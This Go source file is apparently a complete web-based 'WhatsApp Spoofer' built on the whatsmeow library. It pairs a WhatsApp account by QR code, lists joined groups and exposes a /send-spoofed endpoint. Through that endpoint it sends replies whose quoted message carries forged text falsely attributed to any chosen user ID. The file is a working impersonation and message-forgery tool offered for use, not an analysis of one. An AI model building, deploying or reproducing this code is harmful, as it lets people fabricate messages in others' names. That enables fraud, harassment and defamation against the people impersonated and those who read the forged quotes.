// WhatsApp Spoofer - A web-based tool for sending spoofed WhatsApp messages
package main

import (
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"mime"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"google.golang.org/protobuf/proto"
	_ "modernc.org/sqlite"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/appstate"
	waBinary "go.mau.fi/whatsmeow/binary"
	waE2E "go.mau.fi/whatsmeow/proto/waE2E"
	"go.mau.fi/whatsmeow/store"
	"go.mau.fi/whatsmeow/store/sqlstore"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	waLog "go.mau.fi/whatsmeow/util/log"
)

var (
	whatsappClient *whatsmeow.Client
	logger         waLog.Logger
	currentQRCode  string
	isLoggedIn     bool
)

var (
	logLevel        = "INFO"
	debugLogs       = flag.Bool("debug", false, "Enable debug logs")
	dbDialect       = flag.String("db-dialect", "sqlite", "Database dialect (sqlite or postgres)")
	dbAddress       = flag.String("db-address", "./whats-spoofing.db?_pragma=foreign_keys(1)", "Database address")
	requestFullSync = flag.Bool("request-full-sync", false, "Request full (1 year) history sync when logging in")
)

type (
	SpoofedMessageRequest struct {
		ChatID         string `json:"chat_id"`
		MessageID      string `json:"message_id"`
		SpoofedID      string `json:"spoofed_id"`
		SpoofedMessage string `json:"spoofed_message"`
		ReplyMessage   string `json:"reply_message"`
	}

	APIResponse struct {
		Message string `json:"message"`
	}

	StatusResponse struct {
		LoggedIn bool   `json:"loggedIn"`
		QR       string `json:"qr,omitempty"`
	}
)

func main() {
	waBinary.IndentXML = true
	flag.Parse()

	if *debugLogs {
		logLevel = "DEBUG"
	}
	if *requestFullSync {
		store.DeviceProps.RequireFullSync = proto.Bool(true)
	}
	logger = waLog.Stdout("Main", logLevel, true)

	dbLog := waLog.Stdout("Database", logLevel, true)
	storeContainer, err := sqlstore.New(context.Background(), *dbDialect, *dbAddress, dbLog)
	if err != nil {
		logger.Errorf("Failed to connect to database: %v", err)
		return
	}

	device, err := storeContainer.GetFirstDevice(context.Background())
	if err != nil {
		logger.Errorf("Failed to get device: %v", err)
		return
	}

	whatsappClient = whatsmeow.NewClient(device, waLog.Stdout("Client", logLevel, true))

	if device != nil && device.ID != nil && len(device.ID.User) > 0 {
		isLoggedIn = true
	}

	whatsappClient.PrePairCallback = func(jid types.JID, platform, businessName string) bool {
		logger.Infof("Accepting pair %s (platform: %q, business name: %q).", jid, platform, businessName)
		return true
	}

	ch, err := whatsappClient.GetQRChannel(context.Background())
	if err != nil {
		if !errors.Is(err, whatsmeow.ErrQRStoreContainsID) {
			logger.Errorf("Failed to get QR channel: %v", err)
		}
	} else {
		go handleQRCodeEvents(ch)
	}

	whatsappClient.AddEventHandler(handleWhatsAppEvents)
	go startHTTPServer()

	err = whatsappClient.Connect()
	if err != nil {
		logger.Errorf("Failed to connect: %v", err)
		return
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	<-c

	logger.Infof("Interrupt received, exiting")
	whatsappClient.Disconnect()
}

func handleQRCodeEvents(ch <-chan whatsmeow.QRChannelItem) {
	for evt := range ch {
		if evt.Event == "code" {
			currentQRCode = evt.Code
			isLoggedIn = false
			logger.Infof("QR Code generated for login")
		} else {
			logger.Infof("QR channel result: %s", evt.Event)
			if evt.Event == "success" {
				isLoggedIn = true
				currentQRCode = ""
			}
		}
	}
}

func startHTTPServer() {
	mux := http.NewServeMux()

	fileServer := http.FileServer(http.Dir("client/"))
	mux.Handle("/", fileServer)

	mux.HandleFunc("/send-spoofed", handleSendSpoofedMessage)
	mux.HandleFunc("/get-groups", handleGetGroups)
	mux.HandleFunc("/status", handleStatus)

	server := &http.Server{
		Handler:      mux,
		Addr:         "127.0.0.1:8080",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	logger.Infof("HTTP server listening on localhost:8080")
	if err := server.ListenAndServe(); err != nil {
		logger.Errorf("Failed to start HTTP server: %v", err)
	}
}

func cmdSendSpoofedReply(args []string) string {
	if len(args) < 4 {
		return "Usage: send-spoofed-reply <chat_jid> <msgID:!|#ID> <spoofed_jid> <spoofed_text>|<text>"
	}

	chat_jid, ok := parseJID(args[0])
	if !ok {
		return "You need to specify a valid Chat ID (Group or User)"
	}

	msgID := args[1]
	if msgID[0] == '!' {
		msgID = whatsappClient.GenerateMessageID()
	}

	spoofed_jid, ok2 := parseJID(args[2])
	if !ok2 {
		return "You need to specify a valid User ID to spoof"
	}

	parameters := []string{args[3]}
	if len(args) > 4 {
		parameters = append(parameters, args[4])
	}
	if len(parameters) < 2 {
		parts := splitOnPipe(args[3])
		if len(parts) == 2 {
			parameters = parts
		} else {
			return "Invalid format. Use: <spoofed_text>|<text>"
		}
	}
	spoofed_text := parameters[0]
	text := parameters[1]

	_, resp, err := sendSpoofedReplyMessage(chat_jid, spoofed_jid, msgID, spoofed_text, text)
	if err != nil {
		return "Error on sending spoofed msg: " + err.Error()
	}
	return "Spoofed message sent: " + resp.ID
}

func cmdListGroups() string {
	groups, err := whatsappClient.GetJoinedGroups()
	if err != nil {
		return "Failed to get group list: " + err.Error()
	}
	result := ""
	for _, group := range groups {
		result += group.GroupName.Name + ": " + group.JID.String() + "\n"
	}
	return result
}

func splitOnPipe(input string) []string {
	result := []string{}
	current := ""
	for _, char := range input {
		if char == '|' {
			result = append(result, current)
			current = ""
		} else {
			current += string(char)
		}
	}
	result = append(result, current)
	return result
}

func handleSendSpoofedMessage(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var requestData SpoofedMessageRequest
		if err := json.NewDecoder(r.Body).Decode(&requestData); err != nil {
			http.Error(w, "Error parsing JSON request body", http.StatusBadRequest)
			return
		}

		if requestData.ChatID == "" || requestData.MessageID == "" || requestData.SpoofedID == "" || requestData.SpoofedMessage == "" || requestData.ReplyMessage == "" {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		var args = []string{requestData.ChatID, requestData.MessageID, requestData.SpoofedID, requestData.SpoofedMessage + "|" + requestData.ReplyMessage}

		var output = cmdSendSpoofedReply(args)
		logger.Infof("output: %s", output)

		w.WriteHeader(http.StatusOK)

		w.Header().Set("Content-Type", "application/json")

		responseData := APIResponse{
			Message: output,
		}

		if err := json.NewEncoder(w).Encode(responseData); err != nil {
			http.Error(w, "Error encoding JSON response", http.StatusInternalServerError)
			return
		}

		return
	}
	w.WriteHeader(http.StatusBadRequest)
	w.Write([]byte("Invalid request"))
}

func handleGetGroups(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		var output = cmdListGroups()

		w.WriteHeader(http.StatusOK)

		w.Write([]byte(output))

		return
	}
	w.WriteHeader(http.StatusBadRequest)
	w.Write([]byte("Invalid request"))
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		w.Header().Set("Content-Type", "application/json")

		response := StatusResponse{
			LoggedIn: isLoggedIn,
		}

		if !isLoggedIn && currentQRCode != "" {
			response.QR = currentQRCode
		}

		w.WriteHeader(http.StatusOK)
		if err := json.NewEncoder(w).Encode(response); err != nil {
			http.Error(w, "Error encoding JSON response", http.StatusInternalServerError)
			return
		}
		return
	}
	w.WriteHeader(http.StatusBadRequest)
	w.Write([]byte("Invalid request"))
}

func handleWhatsAppEvents(rawEvt interface{}) {
	switch evt := rawEvt.(type) {
	case *events.AppStateSyncComplete:
		if len(whatsappClient.Store.PushName) > 0 && evt.Name == appstate.WAPatchCriticalBlock {
			err := whatsappClient.SendPresence(types.PresenceAvailable)
			logger.Errorf("AppStateSyncComplete %s: %v", rawEvt, err)
		}
		return
	case *events.Connected, *events.PushNameSetting:
		if len(whatsappClient.Store.PushName) == 0 {
			return
		}
		isLoggedIn = true
		currentQRCode = ""
		err := whatsappClient.SendPresence(types.PresenceAvailable)
		if err != nil {
			logger.Errorf("Failed to send presence: %v", err)
		}
		logger.Infof("Successfully connected to WhatsApp")
		return
	case *events.StreamReplaced:
		os.Exit(0)
	case *events.Message:
		logger.Infof("Received message %s from %s (%s)", evt.Info.ID, evt.Info.SourceString())

		img := evt.Message.GetImageMessage()
		if img != nil {
			ok := download("Message.GetImageMessage", evt.Message.GetImageMessage(), evt.Message.GetImageMessage().GetMimetype(), evt, rawEvt)
			if ok == nil {
				return
			}
		}

		audio := evt.Message.GetAudioMessage()
		if audio != nil {
			ok := download("Message.GetAudioMessage", evt.Message.GetAudioMessage(), evt.Message.GetAudioMessage().GetMimetype(), evt, rawEvt)
			if ok == nil {
				return
			}
		}

		video := evt.Message.GetVideoMessage()
		if video != nil {
			ok := download("Message.GetVideoMessage", evt.Message.GetVideoMessage(), evt.Message.GetVideoMessage().GetMimetype(), evt, rawEvt)
			if ok == nil {
				return
			}
		}

		doc := evt.Message.GetDocumentMessage()
		if doc != nil {
			ok := download("Message.GetDocumentMessage", evt.Message.GetDocumentMessage(), evt.Message.GetDocumentMessage().GetMimetype(), evt, rawEvt)
			if ok == nil {
				return
			}
		}

		sticker := evt.Message.GetStickerMessage()
		if sticker != nil {
			ok := download("Message.GetStickerMessage", evt.Message.GetStickerMessage(), evt.Message.GetStickerMessage().GetMimetype(), evt, rawEvt)
			if ok == nil {
				return
			}
		}

		contact := evt.Message.GetContactMessage()
		if contact != nil {
			ok := download("Message.GetContactMessage", evt.Message.GetContactMessage(), "text/vcard", evt, rawEvt)
			if ok == nil {
				return
			}
		}

		postEvent("Message", rawEvt, nil)
		return
	}
}

func postEventFile(evt_type string, raw interface{}, extra interface{}, file_name string, file_bytes []byte) error {
	logger.Infof("Event(%s): \n  File: %s \n  Extra: %+v \n  Raw: %+v", evt_type, file_name, extra, raw)
	return nil
}

func postEvent(evt_type string, raw interface{}, extra interface{}) error {
	logger.Infof("Event(%s): \n%+v", evt_type, raw)
	return nil
}

func postError(evt_type string, evt_error string, raw interface{}) error {
	logger.Errorf("Error(%s): %s \n%+v", evt_type, evt_error, raw)
	return nil
}

func sendSpoofedReplyMessage(chatID types.JID, fromID types.JID, msgID string, replyText string, myText string) (*waE2E.Message, *whatsmeow.SendResponse, error) {
	msg := &waE2E.Message{
		ExtendedTextMessage: &waE2E.ExtendedTextMessage{
			Text: proto.String(myText),
			ContextInfo: &waE2E.ContextInfo{
				StanzaID:    proto.String(msgID),
				Participant: proto.String(fromID.String()),
				QuotedMessage: &waE2E.Message{
					Conversation: proto.String(replyText),
				},
			},
		},
	}
	resp, err := whatsappClient.SendMessage(context.Background(), chatID, msg)
	if err != nil {
		logger.Errorf("Error sending reply message: %v", err)
		return msg, &resp, err
	} else {
		logger.Infof("Message sent (server timestamp: %s)", resp.Timestamp)
		return msg, &resp, err
	}
}

func parseJID(arg string) (types.JID, bool) {
	if arg[0] == '+' {
		arg = arg[1:]
	}
	if !strings.ContainsRune(arg, '@') {
		return types.NewJID(arg, types.DefaultUserServer), true
	} else {
		recipient, err := types.ParseJID(arg)
		if err != nil {
			logger.Errorf("Invalid JID %s: %v", arg, err)
			return recipient, false
		} else if recipient.User == "" {
			logger.Errorf("Invalid JID %s: no server specified", arg)
			return recipient, false
		}
		return recipient, true
	}
}

func download(evt_type string, file interface{}, mimetype string, evt *events.Message, rawEvt interface{}) error {
	if file != nil {
		exts, _ := mime.ExtensionsByType(mimetype)
		file_name := fmt.Sprintf("%s%s", evt.Info.ID, exts[0])
		if mimetype == "text/vcard" {
			data := file.(*waE2E.ContactMessage)
			err := postEventFile(evt_type, rawEvt, nil, file_name, []byte(*data.Vcard))
			if err != nil {
				postError(evt_type, fmt.Sprintf("%s Failed to save event", evt_type), rawEvt)
				return err
			}
		} else {
			data, err := whatsappClient.Download(context.Background(), file.(whatsmeow.DownloadableMessage))
			if err != nil {
				postError(evt_type, fmt.Sprintf("%s Failed to download", evt_type), rawEvt)
				return err
			}
			err = postEventFile(evt_type, rawEvt, nil, file_name, data)
			if err != nil {
				postError(evt_type, fmt.Sprintf("%s Failed to save event", evt_type), rawEvt)
				return err
			}
		}
		return nil
	}
	return errors.New("file is nil")
}
